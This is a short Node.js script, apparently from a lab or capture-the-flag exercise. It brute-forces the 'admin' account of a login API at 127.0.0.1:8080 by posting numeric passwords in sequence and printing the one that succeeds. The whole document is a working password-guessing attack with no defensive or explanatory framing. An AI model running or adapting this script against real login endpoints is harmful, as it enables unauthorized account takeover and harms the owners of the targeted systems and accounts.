axios = require('axios');

passwordNum = 0;

function sendReq(pass) {
  axios.post('http://127.0.0.1:8080/api/login', {
    username: 'admin',
    password: pass.toString()
  })
    .then(function (response) {
      console.log('The password for the admin is: ' + pass);
    })
    .catch(function (error) {
      if (error.response.status == 404) {
        sendReq(passwordNum);
        passwordNum++;
        if (passwordNum % 100 == 0)
          console.log('count: ' + passwordNum);
      } else
        console.log(error);
    });
}

sendReq(passwordNum);
